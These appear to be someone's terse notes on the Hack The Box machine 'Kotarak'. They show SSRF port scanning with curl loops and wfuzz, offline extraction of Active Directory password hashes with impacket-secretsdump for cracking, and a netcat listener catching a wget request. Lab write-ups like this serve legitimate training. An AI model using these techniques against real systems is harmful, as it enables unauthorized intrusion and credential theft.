https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html
https://www.youtube.com/watch?v=38e-sxPWiuY

### Enum on SSRF
```
❯ curl http://10.129.1.117:60000/url.php?path=http://localhost:22
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.
                                                                                                                                                                   
❯ curl http://10.129.1.117:60000/url.php?path=http://localhost:13572
EMPTY RES

for i in {0..65535}; do 
  res=$(curl -s http://10.129.1.117:60000/url.php?path=http://localhost:${i});
  len=$(echo $res | wc -w); 
  if [ "$len" -gt "0" ]; then
    echo -n "${i}: "; 
    echo $res | tr -d "\r" | head -1 | cut -c-100; 
  fi;
done

wfuzz -c -z range,1-65535 http://10.129.1.117:60000/url.php?path=http://localhost:FUZZ

--hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)

wfuzz -c -z range,1-65535 --hl 2 http://10.129.1.117:60000/url.php?path=http://localhost:FUZZ
```

### Dump ntds
```
❯ impacket-secretsdump -ntds -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
❯ cp 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit ntds.dit
                                                                                                                                                                            
❯ cp 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin system.bin
                                                                                                                                                                            
❯ impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
```

```
impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL | tee addump
cat addump | grep ":::" | cut -d: -f4
cat addump | cut -d: -f4
# same as the awk
awk -F: '{print $4}' addump

The reason of this is that the crackstation supports multiple lines

# Try if it's a windows box that can just use those hash
arp -a 
? (10.0.3.133) at 00:16:3e:c9:bd:b1 [ether] on lxcbr0
? (10.129.0.1) at 00:50:56:b9:b2:02 [ether] on eth0
```
It confirmed the Wget at 10.0.3.133 should be exploitable

### Double confirm
`ping -c 1 10.0.3.133`
```
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

### Listening to it
```
atanas@kotarak-dmz:/tmp/ftptest$ authbind nc -lnvp 80

│Listening on [0.0.0.0] (family 0, port 80)
│Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 48142)
│GET /archive.tar.gz HTTP/1.1
│User-Agent: Wget/1.16 (linux-gnu)
│Accept: */*
│Host: 10.0.3.1
│Connection: Keep-Alive
```

### Set up stty with tmux
stty rows 37
https://youtu.be/38e-sxPWiuY?t=1550


